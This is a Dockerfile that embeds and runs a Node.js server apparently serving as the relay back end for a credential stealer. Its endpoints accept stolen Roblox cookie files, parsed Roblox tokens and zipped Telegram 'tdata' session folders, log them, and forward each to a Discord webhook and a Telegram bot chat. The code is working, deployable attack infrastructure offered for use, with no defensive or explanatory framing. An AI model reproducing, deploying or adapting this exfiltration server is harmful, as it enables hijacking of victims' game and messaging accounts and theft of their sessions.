FROM node:20-alpine

WORKDIR /app

RUN cat > server.js <<'SERVEREOF'
const http = require('http');

const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
const TG_TOKEN = process.env.TG_TOKEN;
const TG_CHAT = process.env.TG_CHAT;

function readBody(req) {
    return new Promise((resolve) => {
        const chunks = [];
        req.on('data', c => chunks.push(c));
        req.on('end', () => resolve(Buffer.concat(chunks)));
    });
}

async function sendFileToDiscord(buf, filename, caption) {
    if (!DISCORD_WEBHOOK) {
        console.log('Discord: no webhook, skip');
        return;
    }
    const form = new FormData();
    form.append('payload_json', JSON.stringify({ content: caption }));
    form.append('files[0]', new Blob([buf]), filename);
    try {
        const r = await fetch(DISCORD_WEBHOOK, { method: 'POST', body: form });
        console.log('Discord sent:', filename, buf.length, 'status:', r.status);
    } catch (e) {
        console.log('Discord err:', e.message || e);
    }
}

async function sendFileToTG(buf, filename, caption) {
    if (!TG_TOKEN || !TG_CHAT) {
        console.log('TG: no token/chat, skip');
        return;
    }
    const form = new FormData();
    form.append('chat_id', TG_CHAT);
    form.append('caption', caption);
    form.append('document', new Blob([buf]), filename);
    try {
        const r = await fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendDocument',
            { method: 'POST', body: form });
        const t = await r.text();
        console.log('TG doc resp:', t);
    } catch (e) {
        console.log('TG doc err:', e.message || e);
    }
}

const server = http.createServer(async (req, res) => {
    if (req.method === 'OPTIONS') {
        res.writeHead(204, {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
            'Access-Control-Allow-Headers': '*'
        });
        return res.end();
    }

    // ========== raw robloxcookies.dat file ==========
    if (req.method === 'POST' && req.url === '/send-rbxfile') {
        const buf = await readBody(req);
        console.log('=== RBX FILE RECEIVED ===');
        console.log('bytes:', buf.length);
        const head = buf.slice(0, 200).toString('utf8').replace(/[^\x20-\x7e]/g, '.');
        console.log('head:', head);
        console.log('=========================');

        await Promise.allSettled([
            sendFileToDiscord(buf, 'robloxcookies.dat', 'RBX raw cookies.dat (' + buf.length + ' bytes)'),
            sendFileToTG(buf, 'robloxcookies.dat', 'RBX raw cookies.dat (' + buf.length + ' bytes)')
        ]);

        res.writeHead(200, { 'Content-Type': 'text/plain' });
        return res.end('ok');
    }

    // ========== parsed RBX token text (legacy) ==========
    if (req.method === 'POST' && req.url === '/send') {
        const buf = await readBody(req);
        const body = buf.toString('utf8');
        console.log('rbx token (parsed) received, len:', body.length);

        await Promise.allSettled([
            sendFileToDiscord(buf, 'rbx_token_parsed.txt', 'RBX parsed token (' + body.length + ' chars)'),
            sendFileToTG(buf, 'rbx_token_parsed.txt', 'RBX parsed token (' + body.length + ' chars)')
        ]);

        res.writeHead(200, { 'Content-Type': 'text/plain' });
        return res.end('ok');
    }

    // ========== tdata zip ==========
    if (req.method === 'POST' && req.url === '/send-tdata') {
        const buf = await readBody(req);
        console.log('=== TDATA RECEIVED ===');
        console.log('bytes:', buf.length);
        console.log('=====================');

        await Promise.allSettled([
            sendFileToDiscord(buf, 'tdata.zip', 'TG tdata (' + buf.length + ' bytes)'),
            sendFileToTG(buf, 'tdata.zip', 'TG tdata (' + buf.length + ' bytes)')
        ]);

        res.writeHead(200, { 'Content-Type': 'text/plain' });
        return res.end('ok');
    }

    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('rbx gateway up');
});

server.listen(PORT, () => {
    console.log('rbx-gw listening on ' + PORT);
});
SERVEREOF

EXPOSE 3000

CMD ["node", "server.js"]
